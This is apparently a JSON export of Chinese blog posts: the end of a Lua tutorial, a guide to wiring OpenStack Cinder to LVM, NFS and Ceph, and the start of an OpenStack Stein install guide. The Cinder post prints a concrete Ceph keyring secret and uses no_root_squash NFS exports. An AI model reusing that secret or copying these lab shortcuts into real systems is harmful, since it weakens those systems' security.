一元预算法，返回字符串或表的长度\n例如\n[root@work lua_demo]# lua Lua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; &gt; print(&#x27;HELLO &#x27;..&#x27;WORLD&#x27;) HELLO WORLD&gt; print(#&#x27;hello&#x27;)         5\n\n全局变量&amp;局部变量在Lua语言中，全局变量无须声明即可使用。在默认情况下，变量总是认为是全局的，如果未提前赋值，默认为nil。如果想要声明一个局部变量需要使用local来声明。\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; b=10&gt; print(b)10&gt; local a = 100&gt; print(a)nil&gt; local a = 100; print(a)   100&gt; \n数据类型全部的类型Lua有8个数据类型\nnil(空，无效值)boolean(布尔,true/false)number(数值)string(字符串)function(函数)table(表)thread(线程)userdata(数据用户)\n可以使用type函数测试给定变量或者类型：\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; print(type(nil))nil&gt; print(type(&quot;aaa&quot;))string&gt; \nnilnil是一种只有一个nil值的类型，他的作用可以用来与其他所有值进行区分，也可以当想要移除一个变量时，只需要将该变量名赋值为nil，垃圾回收就会释放该变量所占用的内存。\nbooleanboolean类型具有两个值，true和false。在Lua中，只会将false和nil视为假，其他都是真，特别是在条件检测中0和空字符串都会认为是真，这个和我们熟悉的大多语言不太一样。\nnumber在lua5.3开始，lua语言为数值格式提供了两种选择:integer(整型)和float(双精度浮点型)[和其他语言不太一样，floatu代表单精度类型]，u不管是整形还是双精度浮点型，使用type()函数来取其类型，返回的都是number。还有就是他们之间是可以直接相互转换的。\nstringLua语言中的字符串可以标识单个字符，也可以标识一整本书籍。在Lua语言中，操作100k或者1M个字母组成的字符串的程序很常见。如果字符串数据很多可以这样写\na = [[&lt;html&gt;xxxxxxxxxx&lt;/html&gt;]]\ntabletable是lua语言中最主要和强大的数据结构。使用表，Lua语言可以以一种简单、统一且高效的方式标识数组、合集、记录和其他很多数据结构。Lua语言中的表本质上是一种辅助数组。这种数组比Java中的数组更加灵活，可以使用数值做索引，也可以使用字符串或其他任意类型的值做索引(nil除外)\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; a = &#123;&#125;&gt; arr = &#123;&quot;TOM&quot;,&quot;JERRY&quot;,&quot;ROSE&quot;&#125;&gt; print(arr[0])  nil&gt; print(arr[1])     TOM&gt; print(arr[2]) JERRY&gt; print(arr[3]) ROSE&gt; arr=&#123;&#125;&gt; arr[&quot;X&quot;]=10&gt; arr[&quot;Y&quot;]=20&gt; arr[&quot;Z&quot;]=30&gt; print(arr[&quot;X&quot;])10&gt; print(arr[&quot;Y&quot;])20&gt; print(arr[&quot;Z&quot;])30&gt; arr.X10&gt; arr.Y20&gt; arr.Y20&gt; arr=&#123;&quot;TOM&quot;,X=10,&quot;JERRY&quot;,Y=20,&quot;ROSE&quot;,Z=30&#125;&gt; arr[1]TOM&gt; arr[2]JERRY&gt; arr[3]ROSE&gt; arr[4]nil&gt; arr.X10&gt; arr[&quot;X&quot;]  10&gt; arr.Z30&gt; \nfunction在Lua语言中，函数(Function)是对语句和表达式进行抽象的主要方式定义函数:\nfunction functionName(params)\tcodeend\n函数被调用的时候，传入的参数个数与定义函数时使用的参数个数不一致的时候，Lua会通过抛弃多余参数和将不足的参数设为nil的方式来调整数的个数。\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; function f(a,b)&gt;&gt; print(a,b)&gt;&gt; end&gt; f()nil\tnil&gt; f(2)2\tnil&gt; f(2,6)2\t6&gt; f(2,6,8)2\t6\n可变参数\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; function add(...)&gt;&gt; local a,b,c=...                   &gt;&gt; print(a,b,c)&gt;&gt; end&gt; add(1,2,3)1\t2\t3&gt; add(1)  1\tnil\tnil&gt; add(1,2,3,4,5,6)1\t2\t3&gt; \n返回值\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; function add(a,b)&gt;&gt; return b,a&gt;&gt; end&gt; x,y=add(100,200)&gt; print(y) 100&gt; print(x)200&gt; \n控制结构Lua语言提供了一组精简且常用的控制结构，包括用于条件执行的if以及用户循环的while、repeat和for。所有的控制语法上都有一个显示的终结符：end用于中介if、for以及while结构，until用于中介repeat结构。\nif语句if语句先测试其条件，并根据条件是否满足执行响应的then部分或else部分。else部分是可选的。\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; function testif(a)&gt;&gt; if a&gt;0 then&gt;&gt; print(&quot;a是正数&quot;)&gt;&gt; end&gt;&gt; end&gt; testif(2)   a是正数&gt; testif(1)a是正数&gt; testif(-1)&gt; function testif(a)&gt;&gt; if a&gt;0 then&gt;&gt; print(&quot;a是正数&quot;)&gt;&gt; else&gt;&gt; print(&quot;a是负数&quot;)&gt;&gt; end&gt;&gt; end&gt; testif(1) a是正数&gt; testif(-1)a是负数&gt; \n嵌套IF相关案例如下\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; function show(age)    &gt;&gt; if age &lt;= 18 then&gt;&gt; return &quot;qingshaonian&quot; &gt;&gt; elseif age&gt;18 and age &lt;=45 then&gt;&gt; return &quot;qingnian&quot;&gt;&gt; elseif age&gt;45 and age &lt;=60 then&gt;&gt; return &quot;zhongnianren&quot;&gt;&gt; else&gt;&gt; return &quot;laonianren&quot; &gt;&gt; end&gt;&gt; end&gt; print(show(17))              qingshaonian&gt; print(show(19))qingnian&gt; print(show(56))zhongnianren&gt; print(show(80))laonianren\n\nwhile循环语法如下\nwhile 条件 do\t循环体end\n案例\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; function testwhile()&gt;&gt; local i=1&gt;&gt; while i&lt;=10 do&gt;&gt; print(i)&gt;&gt; i=i+1&gt;&gt; end&gt;&gt; end&gt; testwhile()12345678910\nrepeat循环repeat-until语句回重复执行其循环体直到条件为真时结束。由于条件测试在循环体之后执行，所以至少会循环执行一次。语法如下\nrepeat\t循环体until 条件\n案例如下\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; function testRepeat()&gt;&gt; local i = 10&gt;&gt; repeat&gt;&gt; print(i)&gt;&gt; i=i-1&gt;&gt; until i &lt; 1&gt;&gt; end&gt; testRepeat()10987654321\n\nfor循环数值型语法如下\nfor param=exp1,exp2,exp3 do\t循环体end\nparam的值从exp1变化到exp2之前的每次循环会执行循环体，并在每次循环结束的时候步长，和python的for差不多。案例如下\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; for i = 1,100,10 do &gt;&gt; print(i)&gt;&gt; end1112131415161718191\n泛型泛型for循环是通过一个迭代器函数来遍历所有的值，类似于java中的foreach语句语法\nfor i,v in ipairs(x) do\t循环体end\ni是数组索引，v是对应索引的数组元素值，ipairs是Lua提供的一个迭代器函数，用来迭代数组，x是要遍历的数组。只后pairs也是Lua提供的夜歌迭代函数，他和ipairs的区别是pairs可以迭代一些指定键的table。案例如下\n[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; arr = &#123;&quot;TOME&quot;,&quot;JERRY&quot;,&quot;ROWS&quot;,&quot;LUCY&quot;&#125;&gt; for i,v in ipairs(arr) do&gt;&gt; print(i,v)&gt;&gt; end1\tTOME2\tJERRY3\tROWS4\tLUCY[root@work lua_demo]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; arr = &#123;&quot;TOM&quot;,&quot;JERRY&quot;,&quot;ROSES&quot;,x=&quot;JACK&quot;,&quot;LUCY&quot;&#125;&gt; function testfor(arr)&gt;&gt; for i,v in pairs(arr) do &gt;&gt; print(i,v)&gt;&gt; end&gt;&gt; end&gt; testfor(arr)1\tTOM2\tJERRY3\tROSES4\tLUCYx\tJACK\n","categories":["开发相关","lua"],"tags":["lua"]},{"title":"OpenStack-Cinder块存储-对接LVM、NFS、CEPH","url":"/2025/01/11/OpenStack-Cinder%E5%9D%97%E5%AD%98%E5%82%A8-%E5%AF%B9%E6%8E%A5LVM%E3%80%81NFS%E3%80%81CEPH/","content":"前言参考文档：https://docs.openstack.org/cinder/stein/install/块存储通过cinder组件对接，他也分为控制节点和计算节点的区分。\n控制节点参考文档： https://docs.openstack.org/cinder/stein/install/cinder-controller-install-rdo.html先去创库授权，在控制节点执行下面命令\nmysql -u root -pCREATE DATABASE cinder;GRANT ALL PRIVILEGES ON cinder.* TO &#x27;cinder&#x27;@&#x27;localhost&#x27; \\  IDENTIFIED BY &#x27;CINDER_DBPASS&#x27;;GRANT ALL PRIVILEGES ON cinder.* TO &#x27;cinder&#x27;@&#x27;%&#x27; \\  IDENTIFIED BY &#x27;CINDER_DBPASS&#x27;;\n在认证组件中创建用户、授权\n./admin-openrcopenstack user create --domain default --password CINDER_PASS cinderopenstack role add --project service --user cinder admin\n创建服务实体\nopenstack service create --name cinderv2 \\  --description &quot;OpenStack Block Storage&quot; volumev2openstack service create --name cinderv3 \\  --description &quot;OpenStack Block Storage&quot; volumev3\n创建api访问入口\nopenstack endpoint create --region RegionOne \\  volumev2 public http://controller:8776/v2/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\  volumev2 internal http://controller:8776/v2/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\  volumev2 admin http://controller:8776/v2/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\  volumev3 public http://controller:8776/v3/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\  volumev3 internal http://controller:8776/v3/%\\(project_id\\)sopenstack endpoint create --region RegionOne \\  volumev3 admin http://controller:8776/v3/%\\(project_id\\)s\n安装软件包\nyum install -y openstack-cinder\n备份配置文件\ncp /etc/cinder/cinder.conf&#123;,.bak&#125;egrep -v &quot;^#|^$&quot; /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf \n修改/etc/cinder/cinder.conf 文件，主要是以下内容\n[DEFAULT]my_ip = 10.0.0.11transport_url = rabbit://openstack:RABBIT_PASS@controllerauth_strategy = keystone[database]connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder[keystone_authtoken]www_authenticate_uri = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = cinderpassword = CINDER_PASS[oslo_concurrency]lock_path = /var/lib/cinder/tmp\n以cinder的身份填充数据库，这一步会有一个弃用信息，不用管。\nsu -s /bin/sh -c &quot;cinder-manage db sync&quot; cinder\n对接控制节点的计算服务,编辑nova的配置/etc/nova/nova.conf,主要是下面内容\n[cinder]os_region_name = RegionOne\n重启nova组件\nsystemctl restart openstack-nova-api.service\n启动cinder组件\nsystemctl enable --now openstack-cinder-api.service openstack-cinder-scheduler.service\n验证可以参考链接： https://docs.openstack.org/cinder/stein/install/cinder-verify.html\n存储节点参考文档： https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html官方推荐使用lvm+块存储的方式来做openstack的存储这里在计算节点compute1安装第一个存储节点\nyum install -y lvm2 device-mapper-persistent-data\n启动服务\nsystemctl enable --now lvm2-lvmetad.service\n现在给这个节点添加一个硬盘使用下面命令让主机热加载硬盘\necho &#x27;- - -&#x27; &gt;/sys/class/scsi_host/host0/scan echo &#x27;- - -&#x27; &gt;/sys/class/scsi_host/host1/scan echo &#x27;- - -&#x27; &gt;/sys/class/scsi_host/host2/scan \n开始创建存储卷\npvcreate /dev/sdbvgcreate cinder-volumes /dev/sdb\n编辑lvm的配置文件/etc/lvm/lvm.conf然后参考文档： https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html#prerequisites说是建议不让lvm去扫描咱们使用的这个卷，如果不加可能会导致后期出现各种问题，还有就是如果系统本身也是lvm也需要加上，我这里系统用的就是lvm的方式所以修改的内容是\nfilter = [ &quot;a/sda/&quot;, &quot;a/sdb/&quot;, &quot;r/.*/&quot;]\n他还提醒其他计算节点如果采用的也是lvm也要过滤掉sda，如果是请跟随设置。安装软件包\nyum install -y openstack-cinder targetcli python-keystone\n备份\ncp /etc/cinder/cinder.conf&#123;,.bak&#125;egrep -v &quot;^#|^$&quot; /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf\n修改配置文件/etc/cinder/cinder.conf，主要是下面内容\n[DEFAULT]enabled_backends = lvmglance_api_servers = http://controller:9292# 当前ipmy_ip = 10.0.0.31transport_url = rabbit://openstack:RABBIT_PASS@controllerauth_strategy = keystone[database]connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder[keystone_authtoken]www_authenticate_uri = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = cinderpassword = CINDER_PASS[oslo_concurrency]lock_path = /var/lib/cinder/tmp[lvm]volume_driver = cinder.volume.drivers.lvm.LVMVolumeDrivervolume_group = cinder-volumestarget_protocol = iscsitarget_helper = lioadm\n启动服务\nsystemctl enable --now openstack-cinder-volume.service target.service\n验证参考链接： https://docs.openstack.org/cinder/stein/install/cinder-verify.html此时打开仪表盘会发现项目中多出了一个卷\n其他存储上面对接的是lvm的，下面开始对接nfs和ceph的\n对接NFS具体可以参考： \n\nhttps://docs.openstack.org/cinder/stein/drivers.html#nfsdriver\nhttps://www.cnblogs.com/jiawei2527/p/14028185.html\n\n这里在compute1、2上对接NFS，然后NFS是跑在2上的，为什么要在两台主机上配置呢？是因为一个cinder的存储节点可以对接多种存储，这里为了做演示都展示一下。这里先配置一下NFS，在compute2上，具体操作如下\nyum -y install nfs-utils\n编辑/etc/exports配置文件，写入以下内容\n/data 10.0.0.0/24(rw,async,no_root_squash,no_all_squash)/data2 10.0.0.0/24(rw,async,no_root_squash,no_all_squash)\n创建目录以及启动并加载配置\n[root@compute2 ~]# mkdir /data[root@compute2 ~]# mkdir /data2[root@compute2 ~]# systemctl enable rpcbind[root@compute2 ~]# systemctl enable nfsCreated symlink from /etc/systemd/system/multi-user.target.wants/nfs-server.service to /usr/lib/systemd/system/nfs-server.service.[root@compute2 ~]# systemctl start rpcbind[root@compute2 ~]# systemctl start nfs\n在compute1中执行命令showmount -e 10.0.0.32验证nfs\n[root@compute1 ~]# showmount -e 10.0.0.32Export list for 10.0.0.32:/data2 10.0.0.0/24/data  10.0.0.0/24\n在compute1的cinder上对接NFS存储，编辑配置文件/etc/cinder/cinder.conf，主要修改内容如下\n[DEFAULT]...enabled_backends = lvm,nfs...[lvm]...volume_backend_name = lvm...[nfs]volume_driver = cinder.volume.drivers.nfs.NfsDrivernfs_shares_config = /etc/cinder/nfs_sharesvolume_backend_name = nfs1\n编辑/etc/cinder/nfs_shares写入下面内容\n10.0.0.32:/data\n重启服务\nsystemctl restart openstack-cinder-volume.service\n现在再去compute2去创建第二个存储节点，并且对接NFS参考文档： https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html安装软件包\nyum install -y device-mapper-persistent-data openstack-cinder targetcli python-keystone\n备份\ncp /etc/cinder/cinder.conf&#123;,.bak&#125;egrep -v &quot;^#|^$&quot; /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf\n编辑/etc/cinder/cinder.conf，主要内容如下\n[DEFAULT]glance_api_servers = http://controller:9292enabled_backends  = nfsmy_ip = 10.0.0.32auth_strategy = keystonetransport_url = rabbit://openstack:RABBIT_PASS@controller[database]connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder[keystone_authtoken]www_authenticate_uri = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = cinderpassword = CINDER_PASS[oslo_concurrency]lock_path = /var/lib/cinder/tmp[nfs]volume_driver = cinder.volume.drivers.nfs.NfsDrivernfs_shares_config = /etc/cinder/nfs_sharesvolume_backend_name = nfs2\n编辑NFS连接文件/etc/cinder/nfs_shares,主要内容如下\n10.0.0.32:/data2\n启动服务\nsystemctl enable --now openstack-cinder-volume.service target.service\n这里算是配置了三个存储，一个是compute1上的lvm，nfs1，然后compute2上的一个nfs2，它们三个在openstack也可以做到区分，也建议做区分的使用，打开仪表盘的管理员-》卷-》卷类型中创建三个卷类型挨个更新它们的元数据下面是nfs2的其他三个同理，这里就是给对接的卷做分类，通过配置的volume_backend_name选项做分类，三个都做好之后去计算-》卷-》卷中创建卷，此时就可以选择卷类型我这里挨个创建5G大小的卷，然后去对应提供存储的主机中查看卷情况全部可用，去主机中查看compute1主机的lvmcompute2主机的nfs1和nfs2\n对接Ceph我的Ceph机器的ip对应表如下,网络是互通的\n# 网络配置主机名          NAT网络         node1       10.0.0.150/24node2       10.0.0.151/24node3       10.0.0.152/24\n我ceph的版本是reef，比较新，我这里因为环境问题，操作风险较大，对接的时候建议是采用对应版本的软件，我这里是使用ceph的nautilus版本的客户端去对接reef的Ceph集群，在每一台compute主机上安装ceph工具，S版本集群默认自带的最高就是nautilus版本\nyum -y install ceph-common\n之后在ceph的管理节点上创建一个位置用来存放cinder的数据,具体含义可以参考Ceph的文档\nceph osd pool create volumes 128\n之后再创建一个访问凭证\nceph auth get-or-create client.cinder mon &#x27;allow r&#x27; osd &#x27;allow class-read object_prefix rbd_children, allow rwx pool=volumes,allow rwx pool=vms, allow rx pool=images&#x27;\n执行返回结果如下\n[client.cinder]        key = AQBAE4Jnr2FADxAA+5RG4nU8mOzkL3eHVzcdug==\n需要把这个内容复制到所有openstack节点的/etc/ceph/ceph.client.cinder.keyring位置，命令如下\ncat &gt;&gt; /etc/ceph/ceph.client.cinder.keyring &lt;&lt;EOF[client.cinder]        key = AQBAE4Jnr2FADxAA+5RG4nU8mOzkL3eHVzcdug==EOF# 给权限,两种命令都可以,第一条是需要在cinder组件装好才能用chown cinder:cinder /etc/ceph/ceph.client.cinder.keyringchmod +r /etc/ceph/ceph.client.cinder.keyring\n在所有的compute主机中中配置secret，执行下面命令\n# 生成一个uuiduuidgen# 我这里返回的是 ed4a34e1-590e-4cce-b35a-286a48d7b040 ,注意所有主机都必须是这个uuidcat &gt; secret.xml &lt;&lt;EOF&lt;secret ephemeral=&#x27;no&#x27; private=&#x27;no&#x27;&gt;  &lt;uuid&gt;ed4a34e1-590e-4cce-b35a-286a48d7b040&lt;/uuid&gt;  &lt;usage type=&#x27;ceph&#x27;&gt;    &lt;name&gt;client.cinder secret&lt;/name&gt;  &lt;/usage&gt;&lt;/secret&gt;EOF\n然后定义密钥文件和设置ceph的凭证，\nvirsh secret-define --file secret.xmlcat /etc/ceph/ceph.client.cinder.keyring|grep key|awk &#x27;&#123;print $3&#125;&#x27; &gt; ./client.cinder.keyvirsh secret-set-value --secret ed4a34e1-590e-4cce-b35a-286a48d7b040 --base64 $(cat ./client.cinder.key)\n之后在compute3把Ceph的/etc/ceph/ceph.conf文件拿过来，我这里的的内容如下\n[global]        fsid = 81ecd502-cf4e-11ef-baaf-000c297bc826        mon_host = [v2:10.0.0.150:3300/0,v1:10.0.0.150:6789/0] [v2:10.0.0.151:3300/0,v1:10.0.0.151:6789/0] [v2:10.0.0.152:3300/0,v1:10.0.0.152:6789/0]\n它记录着一些连接地址什么的，需要把这个文件放到对接ceph的cinder的/etc/ceph/ceph.conf中，命令如下\ncat &gt; /etc/ceph/ceph.conf &lt;&lt;EOF[global]        fsid = 81ecd502-cf4e-11ef-baaf-000c297bc826        mon_host = [v2:10.0.0.150:3300/0,v1:10.0.0.150:6789/0] [v2:10.0.0.151:3300/0,v1:10.0.0.151:6789/0] [v2:10.0.0.152:3300/0,v1:10.0.0.152:6789/0]EOF\n在compute3中安装cinder\nyum install -y openstack-cinder targetcli python-keystone\n备份\ncp /etc/cinder/cinder.conf&#123;,.bak&#125;egrep -v &quot;^#|^$&quot; /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf\n修改配置文件/etc/cinder/cinder.conf，主要是下面内容\n[DEFAULT]glance_api_servers = http://controller:9292my_ip = 10.0.0.33 transport_url = rabbit://openstack:RABBIT_PASS@controllerauth_strategy = keystoneenabled_backends = ceph[database]connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder[keystone_authtoken]www_authenticate_uri = http://controller:5000auth_url = http://controller:5000memcached_servers = controller:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = cinderpassword = CINDER_PASS[oslo_concurrency]lock_path = /var/lib/cinder/tmp[ceph]volume_driver = cinder.volume.drivers.rbd.RBDDriverrbd_pool = volumesrados_connect_timeout = -1rbd_user = cinderrbd_secret_uuid = ed4a34e1-590e-4cce-b35a-286a48d7b040volume_backend_name = cephrbd_ceph_conf = /etc/ceph/ceph.conf\n和普通官网不一样的就是我这里没配lvm直接配的ceph,要注意的是my_ip、rbd_secret_uuid、volume_backend_name参数，需要根据自己情况去写。启动服务相关命令如下\nsystemctl enable openstack-cinder-volume.service target.servicesystemctl start openstack-cinder-volume.service target.servicesystemctl restart openstack-cinder-volume.service\n这里在仪表中创建一个卷类型，使用volume_backend_name = ceph来设置元数据尝试创建卷试试成功创建，去ceph中查看在cinder的控制主机中查看\n","categories":["虚拟化平台"],"tags":["开源工具","OpenStack","Stein","Cinder","LVM","NFS","CEPH"]},{"title":"OpenStack-Stein版搭建-1控制1计算","url":"/2025/01/04/OpenStack-Stein%E7%89%88%E6%90%AD%E5%BB%BA-1%E6%8E%A7%E5%88%B61%E8%AE%A1%E7%AE%97/","content":"版本选择Open stack的版本是从A-Z之后的版本似乎是通过年月日来命名的，目前最新版本为2025.1-dev2024.2的版本，从U版开始就得用CentOS8部署了，具体原因没考究，大概率是因为内核的原因，本篇是S版本的教程，具体参考\n组件选择本文只装最基础的组件，Keystone、Glance、Placement、Nova、Neutron、Horizon\n基础环境配置网络环境配置我这里采用两台主机构建基础的openstack，具体可参考文档： https://docs.openstack.org/install-guide/environment-networking-controller.html\n\n\n\n角色\n系统\n配置\n\n\n\ncontroller\nCentOS 7.9\n4G2H\n\n\ncompute1\nCentOS7.9\n1G1H\n\n\n所有主机都配置一下hosts文件，有DNS服务则更好，主机名请跟随hosts文件。\n\n\n\n\n[root@controller ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6     # controller              10.0.0.11       controller# compute1              10.0.0.31       compute1\n时间同步OpenStack所有服务之前是使用Token进行验证的,token都是有有效期的,如果时间对不上则可能会出现token刚分配好就过期了的问题，为了避免时间上不一样的问题，这里使用NTP来进行时间同步。这里使用controller(控制节点)来做NTP服务主机。在每台主机中执行下面命令来设置时区和安装NTP服务\n[root@controller ~]# timedatectl set-timezone Asia/Shanghai[root@controller ~]# yum -y install chrony\n下面编辑配置文件/etc/chrony.conf,内容主要参考下面内容\n[root@controller ~]# cat /etc/chrony.conf |egrep -v &quot;^#|^$&quot;     server ntp5.aliyun.com iburst  driftfile /var/lib/chrony/driftmakestep 1.0 3        rtcsync               allow 10.0.0.0/24     logdir /var/log/chrony\n重启服务\n[root@controller ~]# systemctl restart chronyd\n其他openstack主机参考下面配置\n[root@compute1 ~]# cat /etc/chrony.conf |egrep -v &quot;^#|^$&quot;                          server controller iburst                                                           driftfile /var/lib/chrony/drift                                                    makestep 1.0 3                                                                     rtcsync                                                                            logdir /var/log/chrony\n重启服务\n[root@compute1 ~]# systemctl restart chronyd\n查看状态\n# controller 主机[root@controller ~]# chronyc sources                                               210 Number of sources = 1                                                          MS Name/IP address         Stratum Poll Reach LastRx Last sample                   ===============================================================================    ^* 203.107.6.88                  2   6   377    20   -415us[ -498us] +/-   18ms    [root@controller ~]# dateSat Dec 28 20:38:25 CST 2024                                                       [root@controller ~]## compute1 主机[root@compute1 ~]# chronyc sources                                                 210 Number of sources = 1                                                          MS Name/IP address         Stratum Poll Reach LastRx Last sample                   ===============================================================================    ^* controller                    3   6   377    51   +348us[ +428us] +/-   20ms    [root@compute1 ~]# dateSat Dec 28 20:38:29 CST 2024                                                       \n时间已经同步。\n基础软件包我这里是安装s版本的openstack，参考文档地址： https://docs.openstack.org/install-guide/environment-packages-rdo.html所有主机都执行下面命令,用来安装openstack对应的yum仓库。\nyum install -y centos-release-openstack-stein\n在24年12月28日，他自己的这些源有一部分是不可以用的,通过下面命令进行替换阿里的镜像站\ncd /etc/yum.repos.dsed -i &#x27;s/mirrorlist=/#mirrorlist=/g&#x27; *.reposed -i &#x27;s/#baseurl=/baseurl=/g&#x27; *.reposed -i &#x27;s/mirror.centos.org/mirrors.aliyun.com/g&#x27; *.repo\n安装openstack的客户端管理工具\nyum install python-openstackclient -y \n\n数据库支持在控制节点安装下面工具,文档参考地址： https://docs.openstack.org/install-guide/environment-sql-database-rdo.html\nyum install -y mariadb mariadb-server python2-PyMySQL\n根据配置文件，修改一下数据库的配置，编辑文件/etc/my.cnf.d/openstack.cnf，添加下面内容\n[mysqld]bind-address = 10.0.0.11default-storage-engine = innodbinnodb_file_per_table = onmax_connections = 4096collation-server = utf8_general_cicharacter-set-server = utf8\n启动服务\nsystemctl enable --now mariadb.service\n之后执行命令mysql_secure_installation安全初始化一下数据库\nmysql_secure_installation                           \n我执行的是,并且它们分别代表的含义是\n\n登录的密码 回车(刚装的都是没密码的，所以直接回车)\n是否设置root密码 n(不设置，这个等后面设置)\n是否移除匿名用户 Y(移除)\n是否禁用root远程登陆 Y(禁用)\n是否移除test数据库 Y(移除)\n是否重载权限表 Y(重载)\n\n消息队列支持open stack支持多种的消息队列，建议使用rabbitmq，这里也不用其他的了。具体可以参考文档： https://docs.openstack.org/install-guide/environment-messaging-rdo.html在控制节点执行下面命令安装\nyum install -y rabbitmq-serversystemctl enable --now rabbitmq-server.service# 这一步是创建一个rabbit的用户，并且设置密码rabbitmqctl add_user openstack RABBIT_PASS# 授权新建的用户权限rabbitmqctl set_permissions openstack &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;\n\n缓存支持在控制节点为openstack提供缓存支持，具体可参考文档： https://docs.openstack.org/install-guide/environment-memcached-rdo.html执行下面命令\nyum install -y memcached python-memcached\n紧接着修改一下他的配置文件&#96;&#x2F;etc&#x2F;sysconfig&#x2F;memcached\nOPTIONS=&quot;-l 127.0.0.1,::1&quot;# 把上面内容替换成下面的内容OPTIONS=&quot;-l 127.0.0.1,::1,controller&quot;\n替换的作用主要是为了公开服务，默认只是监听本地的127.0.0.1，外部是无法访问的，controller则是自己的主机的域名，指向的是自己在当前网络环境的ip。执行下面命令启动服务\nsystemctl enable --now memcached.service\n\nETCD支持本架构不需要ETCD的支持，本文安装的组件和ETCD都没关联。其他组件可能用到ETCD，在进阶的安装情况下得注意这个基础环境。\n组件安装参考文档： https://docs.openstack.org/keystone/stein/install/关于文档要注意的是，默认文档打开是没有老版本文档的直链的，需要在stein替换成自己想要装的版本。\nKeystone - 认证服务参考文档： https://docs.openstack.org/keystone/stein/install/keystone-install-rdo.html在控制节点执行下面内容，用来授权Keystone服务在数据库中的支持\n[root@controller ~]# mysql                                                         Welcome to the MariaDB monitor.  Commands end with ; or \\g.                        Your MariaDB connection id is 15                                                   Server version: 10.3.10-MariaDB MariaDB Server                                     Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.               Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.     MariaDB [(none)]&gt; CREATE DATABASE keystone;                                        Query OK, 1 row affected (0.000 sec)                                               MariaDB [(none)]&gt;  GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;localhost&#x27; \\      -&gt; IDENTIFIED BY &#x27;KEYSTONE_DBPASS&#x27;;                                            Query OK, 0 rows affected (0.001 sec)                                              MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;%&#x27; \\               -&gt; IDENTIFIED BY &#x27;KEYSTONE_DBPASS&#x27;;                                            Query OK, 0 rows affected (0.000 sec) MariaDB [(none)]&gt;\n安装相关的包\nyum install -y openstack-keystone httpd mod_wsgi\n修改配置文件/etc/keystone/keystone.conf,再修改之前需要注意的是,文件中有很多很多的注释,还全都是英文的,而且里面有很多Keystone不同类型的配置，直接修改并不好，这里可以通过执行下面命令来简化原本的配置文件，之后在进行修改\n# 备份cp /etc/keystone/keystone.conf&#123;,.bak&#125;# 去除空行和注释egrep -v &quot;^$|^#&quot; /etc/keystone/keystone.conf.bak &gt; /etc/keystone/keystone.conf\n正常来说，配置文件中所有的配置段的配置都是空的，然后现在添加下面配置\n# database 配置段中添加下面配置，这里是连接数据库的协议连接，具体代表的内容这里不多写。connection = mysql+pymysql://keystone:KEYSTONE_DBPASS@controller/keystone# token 配置段中添加下面配置，这段配置的作用是指定当前组件使用什么方法提供令牌。provider = fernet\n保存后去用keystone的身份去填充数据库\nsu -s /bin/sh -c &quot;keystone-manage db_sync&quot; keystone\n填充后可以使用下面命令去验证，正常的情况应该是会有好多表，如果啥都没有那应该是出问题了。\nmysql keystone -e &quot;show tables;&quot;\n下面开始初始化 Fernet 密钥存储库，执行下面命令\nkeystone-manage fernet_setup --keystone-user keystone --keystone-group keystonekeystone-manage credential_setup --keystone-user keystone --keystone-group keystone\n初始化keystone,这里定义了一些基础信息,如果有修改请根据自己的环境修改。\nkeystone-manage bootstrap --bootstrap-password ADMIN_PASS \\ --bootstrap-admin-url http://controller:5000/v3/ \\ --bootstrap-internal-url http://controller:5000/v3/ \\ 